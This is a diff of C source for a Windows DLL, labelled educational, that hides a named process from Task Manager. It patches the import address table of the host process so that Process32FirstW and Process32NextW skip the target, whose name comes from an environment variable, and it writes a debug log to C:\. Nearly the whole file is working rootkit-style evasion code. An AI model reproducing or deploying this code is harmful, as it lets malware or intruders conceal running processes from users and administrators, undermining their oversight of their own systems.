@@ -1,41 +1,33 @@
 /**
  * Windows Process Hiding Library - Educational Purpose Only
  * 
- * This code demonstrates how process hiding works by hooking
- * Windows API functions related to process enumeration.
- * Improved version with IAT hooking for better effectiveness.
+ * Simplified version with reliable IAT hooking for 64-bit Windows
  */
 
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
-#include <psapi.h>
 
-// Target process name to hide
-static WCHAR g_TargetProcess[MAX_PATH] = {0};
-static DWORD g_TargetPID = 0;
-
-// Function pointer types for the functions we'll hook
-typedef BOOL (WINAPI *PROCESS32FIRSTW)(HANDLE, LPPROCESSENTRY32W);
-typedef BOOL (WINAPI *PROCESS32NEXTW)(HANDLE, LPPROCESSENTRY32W);
-typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);
+// Target process name (set by environment variable)
+static WCHAR g_targetProcess[MAX_PATH] = {0};
+static DWORD g_targetPID = 0;
 
 // Original function pointers
-static PROCESS32FIRSTW OriginalProcess32FirstW = NULL;
-static PROCESS32NEXTW OriginalProcess32NextW = NULL;
-static ENUMPROCESSES OriginalEnumProcesses = NULL;
+typedef BOOL (WINAPI *PROCESS32FIRSTW_PROC)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL (WINAPI *PROCESS32NEXTW_PROC)(HANDLE, LPPROCESSENTRY32W);
+
+static PROCESS32FIRSTW_PROC g_originalProcess32FirstW = NULL;
+static PROCESS32NEXTW_PROC g_originalProcess32NextW = NULL;
 
 // Get PID from process name
-DWORD GetPIDFromName(LPCWSTR processName) {
-    HANDLE hSnapshot;
-    PROCESSENTRY32W pe32;
-    DWORD pid = 0;
-    
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+DWORD GetPIDFromProcessName(LPCWSTR processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
     
+    PROCESSENTRY32W pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32W);
     
+    DWORD pid = 0;
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
             if (_wcsicmp(pe32.szExeFile, processName) == 0) {
@@ -49,15 +41,23 @@ DWORD GetPIDFromName(LPCWSTR processName) {
     return pid;
 }
 
-// Hooked Process32FirstW
+// Hook Process32FirstW to skip target process
 BOOL WINAPI HookedProcess32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
-    BOOL result = OriginalProcess32FirstW(hSnapshot, lppe);
+    // Call original function first
+    if (!g_originalProcess32FirstW) {
+        g_originalProcess32FirstW = (PROCESS32FIRSTW_PROC)GetProcAddress(
+            GetModuleHandleW(L"kernel32.dll"), "Process32FirstW");
+    }
     
-    // Skip target process
-    while (result && g_TargetProcess[0] != L'\0') {
-        if (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
-            lppe->th32ProcessID == g_TargetPID) {
-            result = OriginalProcess32NextW(hSnapshot, lppe);
+    BOOL result = g_originalProcess32FirstW(hSnapshot, lppe);
+    
+    // Skip target process if found
+    while (result && g_targetProcess[0] != L'\0') {
+        if (_wcsicmp(lppe->szExeFile, g_targetProcess) == 0 || 
+            lppe->th32ProcessID == g_targetPID) {
+            // Get next process instead
+            result = g_originalProcess32FirstW ? 
+                Process32NextW(hSnapshot, lppe) : FALSE;
         } else {
             break;
         }
@@ -66,148 +66,118 @@ BOOL WINAPI HookedProcess32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
     return result;
 }
 
-// Hooked Process32NextW
+// Hook Process32NextW to skip target process
 BOOL WINAPI HookedProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
+    if (!g_originalProcess32NextW) {
+        g_originalProcess32NextW = (PROCESS32NEXTW_PROC)GetProcAddress(
+            GetModuleHandleW(L"kernel32.dll"), "Process32NextW");
+    }
+    
     BOOL result;
     
+    // Keep getting next process until we find one that's not our target
     do {
-        result = OriginalProcess32NextW(hSnapshot, lppe);
+        result = g_originalProcess32NextW(hSnapshot, lppe);
         if (!result) break;
         
-        // Skip if this is our target process
-        if (g_TargetProcess[0] != L'\0' && 
-            (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
-             lppe->th32ProcessID == g_TargetPID)) {
-            continue;
+        // If this is our target process, skip it
+        if (g_targetProcess[0] != L'\0' && 
+            (_wcsicmp(lppe->szExeFile, g_targetProcess) == 0 || 
+             lppe->th32ProcessID == g_targetPID)) {
+            continue;  // Skip this one
         }
         
-        break;
+        break;  // Found a process that's not our target
     } while (result);
     
     return result;
 }
 
-// Hooked EnumProcesses
-BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesReturned) {
-    BOOL result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
+// Simple IAT patching function
+BOOL PatchIAT(HMODULE hModule, LPCSTR targetDLL, LPCSTR functionName, LPVOID newFunction) {
+    if (!hModule || !targetDLL || !functionName || !newFunction) return FALSE;
     
-    if (result && g_TargetPID != 0 && pBytesReturned && pProcessIds) {
-        DWORD count = *pBytesReturned / sizeof(DWORD);
-        DWORD newCount = 0;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+    
+    DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    if (importRVA == 0) return FALSE;
+    
+    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + importRVA);
+    
+    while (importDesc->Name) {
+        LPCSTR dllName = (LPCSTR)((BYTE*)hModule + importDesc->Name);
         
-        // Filter out target process
-        for (DWORD i = 0; i < count; i++) {
-            if (pProcessIds[i] != g_TargetPID) {
-                pProcessIds[newCount++] = pProcessIds[i];
-            }
-        }
-        
-        *pBytesReturned = newCount * sizeof(DWORD);
-    }
-    
-    return result;
-}
-
-// Simple IAT hooking function
-BOOL HookFunction(HMODULE hModule, LPCSTR szFunc, LPVOID pNewFunc, LPVOID* ppOldFunc) {
-    if (!hModule || !szFunc || !pNewFunc || !ppOldFunc) return FALSE;
-    
-    LPVOID pOriginal = GetProcAddress(hModule, szFunc);
-    if (!pOriginal) return FALSE;
-    
-    *ppOldFunc = pOriginal;
-    
-    // Get Import Address Table
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
-    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
-    
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
-    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
-    
-    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + 
-        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
-    
-    // Find kernel32.dll or psapi.dll imports
-    while (pImportDesc->Name) {
-        LPSTR pszModName = (LPSTR)((BYTE*)hModule + pImportDesc->Name);
-        if (_stricmp(pszModName, "kernel32.dll") == 0 || _stricmp(pszModName, "psapi.dll") == 0) {
-            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
+        if (_stricmp(dllName, targetDLL) == 0) {
+            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
+            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->OriginalFirstThunk);
             
-            while (pThunk->u1.Function) {
-                LPVOID* ppfn = (LPVOID*)&pThunk->u1.Function;
-                if (*ppfn == pOriginal) {
-                    DWORD dwOldProtect;
-                    if (VirtualProtect(ppfn, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect)) {
-                        *ppfn = pNewFunc;
-                        VirtualProtect(ppfn, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
-                        return TRUE;
+            while (thunk->u1.Function && origThunk->u1.Ordinal) {
+                if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
+                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + origThunk->u1.AddressOfData);
+                    
+                    if (strcmp((char*)importByName->Name, functionName) == 0) {
+                        DWORD oldProtect;
+                        if (VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), PAGE_READWRITE, &oldProtect)) {
+                            thunk->u1.Function = (DWORD_PTR)newFunction;
+                            VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), oldProtect, &oldProtect);
+                            return TRUE;
+                        }
                     }
                 }
-                pThunk++;
+                thunk++;
+                origThunk++;
             }
         }
-        pImportDesc++;
+        importDesc++;
     }
     
     return FALSE;
 }
 
-// Setup hooks with IAT hooking
-void SetupProcessHooks() {
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    HMODULE hPsapi = GetModuleHandleW(L"psapi.dll");
-    HMODULE hCurrentModule = GetModuleHandleW(NULL); // Current process (taskmgr.exe)
-    
-    if (hKernel32 && hCurrentModule) {
-        // Try to hook Process32FirstW and Process32NextW
-        if (!HookFunction(hCurrentModule, "Process32FirstW", HookedProcess32FirstW, (LPVOID*)&OriginalProcess32FirstW)) {
-            // Fallback: get function addresses directly
-            OriginalProcess32FirstW = (PROCESS32FIRSTW)GetProcAddress(hKernel32, "Process32FirstW");
-        }
-        
-        if (!HookFunction(hCurrentModule, "Process32NextW", HookedProcess32NextW, (LPVOID*)&OriginalProcess32NextW)) {
-            // Fallback: get function addresses directly
-            OriginalProcess32NextW = (PROCESS32NEXTW)GetProcAddress(hKernel32, "Process32NextW");
-        }
-    }
-    
-    if (hPsapi && hCurrentModule) {
-        // Try to hook EnumProcesses
-        if (!HookFunction(hCurrentModule, "EnumProcesses", HookedEnumProcesses, (LPVOID*)&OriginalEnumProcesses)) {
-            // Fallback: get function address directly
-            OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
-        }
-    }
-}
-
-// DLL entry point
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    switch (fdwReason) {
+// DLL Entry Point
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
         case DLL_PROCESS_ATTACH: {
-            CHAR envVar[MAX_PATH];
-            if (GetEnvironmentVariableA("TARGET_PROCESS", envVar, MAX_PATH)) {
+            // Get target process from environment variable
+            CHAR envBuffer[MAX_PATH];
+            DWORD result = GetEnvironmentVariableA("TARGET_PROCESS", envBuffer, MAX_PATH);
+            
+            if (result > 0 && result < MAX_PATH) {
                 // Convert to wide string
-                MultiByteToWideChar(CP_ACP, 0, envVar, -1, g_TargetProcess, MAX_PATH);
+                MultiByteToWideChar(CP_ACP, 0, envBuffer, -1, g_targetProcess, MAX_PATH);
                 
-                // Get the PID of the target process
-                g_TargetPID = GetPIDFromName(g_TargetProcess);
+                // Get PID of target process
+                g_targetPID = GetPIDFromProcessName(g_targetProcess);
                 
-                // Setup hooks
-                SetupProcessHooks();
+                // Log to a file for debugging
+                HANDLE hLogFile = CreateFileW(L"C:\\process_hider_debug.txt", 
+                    GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 
+                    FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hLogFile != INVALID_HANDLE_VALUE) {
+                    WCHAR logMsg[256];
+                    swprintf_s(logMsg, 256, L"DLL loaded. Target: %ls, PID: %lu\r\n", 
+                        g_targetProcess, g_targetPID);
+                    DWORD written;
+                    WriteFile(hLogFile, logMsg, (DWORD)(wcslen(logMsg) * sizeof(WCHAR)), &written, NULL);
+                    CloseHandle(hLogFile);
+                }
                 
-                // Create a log file for educational purposes
-                FILE* logFile;
-                if (fopen_s(&logFile, "C:\\process_hider_log.txt", "w") == 0 && logFile) {
-                    fwprintf(logFile, L"Process hiding active for: %ls (PID: %lu)\n", 
-                            g_TargetProcess, g_TargetPID);
-                    fprintf(logFile, "Educational purposes only!\n");
-                    fclose(logFile);
+                // Patch IAT for current module (taskmgr.exe)
+                HMODULE hCurrentModule = GetModuleHandleW(NULL);
+                if (hCurrentModule) {
+                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32FirstW", HookedProcess32FirstW);
+                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32NextW", HookedProcess32NextW);
                 }
             }
             break;
         }
+        
         case DLL_PROCESS_DETACH:
-            // Cleanup could be implemented here
+            // Cleanup if needed
             break;
     }
     
